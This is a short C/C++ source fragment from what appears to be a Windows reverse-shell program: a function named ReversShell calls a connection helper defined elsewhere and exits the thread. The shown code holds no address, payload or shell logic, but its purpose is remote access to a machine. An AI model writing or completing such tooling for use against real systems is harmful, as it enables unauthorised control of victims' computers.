#include "pa5a.hpp"

EXTERN_C_START

BOOL ReversShell()
{

    if (WS_Connection() == FALSE)
    {
        printf("Failed to initiate connection with the server\n");
        ExitThread(EXIT_FAILURE);
    }
    
    ExitThread(EXIT_SUCCESS);
}

EXTERN_C_END